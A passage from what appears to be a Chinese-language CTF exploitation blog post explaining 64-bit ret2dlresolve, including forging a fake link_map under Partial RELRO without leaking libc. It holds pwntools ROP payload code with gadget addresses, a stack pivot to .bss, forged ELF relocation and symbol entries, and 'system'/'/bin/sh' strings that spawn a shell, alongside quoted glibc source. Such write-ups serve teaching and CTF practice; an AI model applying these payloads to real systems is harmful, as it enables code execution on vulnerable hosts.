</span></span><br><span class="line">payload =p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(link_map_addr+<span class="number">0x1c8</span>)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">8</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用system</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(binsh_addr)</span><br><span class="line">payload+=p64(plt_0)</span><br><span class="line">payload+=p64(fake_write_reloc_age)</span><br><span class="line">payload =payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造虚假的重定位表项</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*rel_plt_align</span><br><span class="line">payload+=fake_write_Elf64_Rela</span><br><span class="line">payload =payload.ljust(<span class="number">0x180</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造虚假的符号表项</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*rel_sym_align</span><br><span class="line">payload+=fake_write_Elf64_Sym</span><br><span class="line">payload =payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造虚假的字符串</span></span><br><span class="line">payload+=<span class="string">&#x27;system\x00\x00&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sn(io,payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sn(io,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位下伪造fake-link-map进行攻击（Partial-RELRO且无需泄露地址）"><a href="#64位下伪造fake-link-map进行攻击（Partial-RELRO且无需泄露地址）" class="headerlink" title="64位下伪造fake link_map进行攻击（Partial RELRO且无需泄露地址）"></a>64位下伪造fake link_map进行攻击（Partial RELRO且无需泄露地址）</h3><p>上面的攻击方式需要泄露地址，但可以泄露地址的话可能上面的攻击就会显得非常繁琐，没有必要，所以我们需要另一种攻击方式来达到我们的目的，我们之前的攻击思路还有一种没有使用，对link_map进行伪造进行攻击</p><p>我们再回看之前的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们没有太关注这里的else分支，DL_FIXUP_MAKE_VALUE函数是来寻找函数的真实地址，我们只要让**(sym-&gt;st_other)&amp;0x03 == 0**不成立，让函数进入下面的else语句，并且让 l-&gt;l_addr + sym-&gt;st_value指向system函数即可。</p><p>我们肯定不知道system的真实地址的，所以我们无法直接达到我们的目的，但是我们可以<strong>先将l-&gt;l_addr和sym-&gt;st_value其中 之一落在got表的某个已解析的函数上，另一个设置为system函数和这个函数 的偏移值</strong>。既然我们都伪造了link_map，那么显然l_addr是我们可以控制的，而sym根据我们上面的源码分析， 它的值最终也是从link_map中获得的。只要我们控制了link_map，l-&gt;l_addr和sym-&gt;st_value就是可控的。当我们知道了libc版本，就可以得到system的地址。</p><p>我们可以让sym-&gt;st_value落在某个已经解析过的got表上。那么sym的地址就是这个got表项的地址减去8，这时<strong>只要保证sym的地址上的函数也是已经解析过的此时sym-&gt;st_other一般为0x7f,如此就可以保证(sym-&gt;st_other)&amp;0x03 != 0</strong>，如果sym不是对应着另一个函数的got表，就需要确保（*(sym+5))&amp;0x03 != 0</p><p>剩下的就是保证l-&gt;l_addr是我们想要的值，但又没法泄露libc，这样我们就要控制符号表symtab以及reloc-&gt;r_info,所以我们得<strong>伪造 DT_SYMTAB, DT_JMPREL</strong>，我们得伪造strtab为可读地址，所以还得伪造<strong>DT_STRTAB</strong>，所以我们需要<strong>伪造link_map前0xf8个字节的数据</strong>，需要关注的分别是位于<strong>link_map+0的l_addr，位于link_map+0x68的 DT_STRTAB指针，位于link_map+0x70的DT_SYMTAB指针和位于link_map+0xF8的DT_JMPREL指针</strong>。此外，我们需要<strong>伪造Elf64_Sym结构体，Elf64_Rela结构体</strong>，由于DT_JMPREL指向的是<strong>Elf64_Dyn结构体</strong>，我们也需要 伪造一个这样的结构体。当然，我们得让reloc_offset为0.为了伪造的方便，我们可以选择让l-&gt;l_addr 为已解析函数内存地址和system的偏移，sym-&gt;st_value为已解析的函数地址的指针-8，即其got表项-8.</p><p>我们再看看link_map的结构体，该结构体定义在*/include/link.h*</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* Structure describing a loaded shared object.  The `l_next&#x27; and `l_prev&#x27;</span></span><br><span class="line"><span class="comment">   members form a chain of all the shared objects loaded at startup.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   These data structures exist in space used by the run-time dynamic linker;</span></span><br><span class="line"><span class="comment">   modifying them may have disastrous results.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This data structure might change in future, if necessary.  User-level</span></span><br><span class="line"><span class="comment">   programs must avoid defining objects of this type.  */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Phdr)</span> *l_phdr</span>;<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array of DT_NEEDED dependencies and their dependencies, in</span></span><br><span class="line"><span class="comment">       dependency order for symbol lookup (with and without</span></span><br><span class="line"><span class="comment">       duplicates).  There is no entry before the dependencies have</span></span><br><span class="line"><span class="comment">       been loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask</span>;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">      <span class="keyword">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">      <span class="keyword">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">lt_executable,<span class="comment">/* The main executable program.  */</span></span><br><span class="line">lt_library,<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">lt_loaded<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">      &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_relocated:<span class="number">1</span>;<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_global:<span class="number">1</span>;<span class="comment">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reserved:<span class="number">2</span>;<span class="comment">/* Reserved for internal use.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_phdr_allocated:<span class="number">1</span>; <span class="comment">/* Nonzero if the data structure pointed</span></span><br><span class="line"><span class="comment">to by `l_phdr&#x27; is allocated.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_soname_added:<span class="number">1</span>; <span class="comment">/* Nonzero if the SONAME is for sure in</span></span><br><span class="line"><span class="comment">      the l_libname list.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_faked:<span class="number">1</span>;<span class="comment">/* Nonzero if this is a faked descriptor</span></span><br><span class="line"><span class="comment">   without associated file.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_need_tls_init:<span class="number">1</span>; <span class="comment">/* Nonzero if GL(dl_init_static_tls)</span></span><br><span class="line"><span class="comment">       should be called on this link map</span></span><br><span class="line"><span class="comment">       when relocation finishes.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_auditing:<span class="number">1</span>;<span class="comment">/* Nonzero if the DSO is used in auditing.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_audit_any_plt:<span class="number">1</span>; <span class="comment">/* Nonzero if at least one audit module</span></span><br><span class="line"><span class="comment">       is interested in the PLT interception.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_removed:<span class="number">1</span>;<span class="comment">/* Nozero if the object cannot be used anymore</span></span><br><span class="line"><span class="comment">   since it is removed.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_contiguous:<span class="number">1</span>; <span class="comment">/* Nonzero if inter-segment holes are</span></span><br><span class="line"><span class="comment">    mprotected or if no holes are present at</span></span><br><span class="line"><span class="comment">    all.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_symbolic_in_local_scope:<span class="number">1</span>; <span class="comment">/* Nonzero if l_local_scope</span></span><br><span class="line"><span class="comment"> during LD_TRACE_PRELINKING=1</span></span><br><span class="line"><span class="comment"> contains any DT_SYMBOLIC</span></span><br><span class="line"><span class="comment"> libraries.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_free_initfini:<span class="number">1</span>; <span class="comment">/* Nonzero if l_initfini can be</span></span><br><span class="line"><span class="comment">       freed, ie. not allocated with</span></span><br><span class="line"><span class="comment">       the dummy malloc in ld.so.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected information about own RPATH directories.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_rpath_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected results of relocation while profiling.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reloc_result</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      DL_FIXUP_VALUE_TYPE addr;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">bound</span>;</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> boundndx;</span><br><span class="line">      <span class="keyword">uint32_t</span> enterexit;</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    &#125; *l_reloc_result;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pointer to the version information if available.  */</span></span><br><span class="line">    ElfW(Versym) *l_versyms;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* String specifying the path where this object was found.  */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *l_origin;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start and finish of memory map for this object.  l_map_start</span></span><br><span class="line"><span class="comment">       need not be the same as l_addr.  */</span></span><br><span class="line">    ElfW(Addr) l_map_start, l_map_end;</span><br><span class="line">    <span class="comment">/* End of the executable part of the mapping.  */</span></span><br><span class="line">    ElfW(Addr) l_text_end;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Default array for &#x27;l_scope&#x27;.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_scope_mem</span>[4];</span></span><br><span class="line">    <span class="comment">/* Size of array allocated for &#x27;l_scope&#x27;.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_scope_max;</span><br><span class="line">    <span class="comment">/* This is an array defining the lookup scope for this link map.</span></span><br><span class="line"><span class="comment">       There are initially at most three different scope lists.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">l_scope</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* A similar array, this time only with the local scope.  This is</span></span><br><span class="line"><span class="comment">       used occasionally.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_local_scope</span>[2];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This information is kept to check for sure whether a shared</span></span><br><span class="line"><span class="comment">       object is the same as one already loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_file_id</span> <span class="title">l_file_id</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected information about own RUNPATH directories.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_runpath_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* List of object in order of the init and fini calls.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">l_initfini</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* List of the dependencies introduced through symbol binding.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> act;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">list</span>[];</span></span><br><span class="line">      &#125; *l_reldeps;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reldepsmax;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Nonzero if the DSO is used.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_used;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Various flag words.  */</span></span><br><span class="line">    ElfW(Word) l_feature_1;</span><br><span class="line">    ElfW(Word) l_flags_1;</span><br><span class="line">    ElfW(Word) l_flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Temporarily used in `dl_close&#x27;.  */</span></span><br><span class="line">    <span class="keyword">int</span> l_idx;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span> <span class="title">l_mach</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">      <span class="keyword">int</span> type_class;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">value</span>;</span></span><br><span class="line">      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *ret</span>;</span><br><span class="line">    &#125; l_lookup_cache;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Thread-local storage related info.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start of the initialization image.  */</span></span><br><span class="line">    <span class="keyword">void</span> *l_tls_initimage;</span><br><span class="line">    <span class="comment">/* Size of the initialization image.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_initimage_size;</span><br><span class="line">    <span class="comment">/* Size of the TLS block.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_blocksize;</span><br><span class="line">    <span class="comment">/* Alignment requirement of the TLS block.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_align;</span><br><span class="line">    <span class="comment">/* Offset of first byte module alignment.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> NO_TLS_OFFSET</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> NO_TLS_OFFSET0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FORCED_DYNAMIC_TLS_OFFSET</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> NO_TLS_OFFSET == 0</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -1</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">elif</span> NO_TLS_OFFSET == -1</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -2</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">error</span> <span class="meta-string">&quot;FORCED_DYNAMIC_TLS_OFFSET is not defined&quot;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* For objects present at startup time: offset in the static TLS block.  */</span></span><br><span class="line">    <span class="keyword">ptrdiff_t</span> l_tls_offset;</span><br><span class="line">    <span class="comment">/* Index of the module in the dtv array.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_modid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of thread_local objects constructed by this DSO.  This is</span></span><br><span class="line"><span class="comment">       atomically accessed and modified and is not always protected by the load</span></span><br><span class="line"><span class="comment">       lock.  See also: CONCURRENCY NOTES in cxa_thread_atexit_impl.c.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_dtor_count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Information used to change permission after the relocations are</span></span><br><span class="line"><span class="comment">       done.  */</span></span><br><span class="line">    ElfW(Addr) l_relro_addr;</span><br><span class="line">    <span class="keyword">size_t</span> l_relro_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> l_serial;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Audit information.  This array apparent must be the last in the</span></span><br><span class="line"><span class="comment">       structure.  Never add something after it.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">uintptr_t</span> cookie;</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> bindflags;</span><br><span class="line">    &#125; l_audit[<span class="number">0</span>];</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>我们会发现上面的结构体非常的复杂，很难找到我们<strong>STRTAB/SYMTAB/JMPREL</strong>这3个表存放的位置，但是通过动态调试我们可以得知这三个地址存放分别位于<strong>link_map+0x68/0x70/0xf8</strong>处，如此一来我们只需要将这三个表伪造出来，然后在相应位置存放它们的地址即可。</p><p>我们先确定一下sym-&gt;st_value应该落在哪个函数上，我们先查看write函数got表项前一个表项的值</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210826203620182.png" alt="查看got表项"></p><p>可以确定是可以使用write作为sym-&gt;st_value。</p><p>确认我们需要用到的一些位置</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">jmp_dl_fixup=<span class="number">0x401026</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line">fake_link_map_addr=fake_stack+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0x40121A</span>    <span class="comment">#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br><span class="line">gadget2=<span class="number">0x401200</span>    <span class="comment">#mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8]</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x40113d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">leave_ret=<span class="number">0x40118f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们先将栈迁移到.bss段准备并在栈里读入我们的payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp,不可为0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(fake_stack)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x500</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbp_ret)<span class="comment">#返回到pop rbp; retn，劫持栈。</span></span><br><span class="line">payload += p64(fake_stack)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br></pre></td></tr></table></figure><p>接下来就是重头戏伪造我们的link_map，在伪造link_map之前我们先把需要用到的三个表先伪造好</p><p>伪造.dynamic里的重定位表项</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_relplt_Elf64_Dyn =p64(<span class="number">0</span>)                                   <span class="comment">#d_tag  标签，用不到可以随意设置</span></span><br><span class="line">fake_relplt_Elf64_Dyn+=p64(fake_Elf64_Rela_addr)                <span class="comment">#d_ptr  指向虚假的Elf64_Rela结构体的指针。因为reloc_offset被简化为0，所以该地址就是我们伪造的地址</span></span><br></pre></td></tr></table></figure><p>伪造重定位表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_Elf64_Rela =flat(fake_link_map_addr-system_write_offset)   <span class="comment">#r_offset   rel_addr = l-&gt;addr+r_offset,这里让其写入一个可写地址即可，这里选择fake_link_map，因为我们的l-&gt;addr为system_write_offset那么r_offset=fake_link_map_addr-system_write_offset</span></span><br><span class="line">fake_Elf64_Rela+=p64(<span class="number">7</span>)                                         <span class="comment">#r_info     index设置为0，最后一字节必须为7</span></span><br><span class="line">fake_Elf64_Rela+=p64(<span class="number">0</span>)                                         <span class="comment">#r_addend   任意设置即可</span></span><br></pre></td></tr></table></figure><p>伪造符号表</p><figure class="highlight python"><table><tr><td 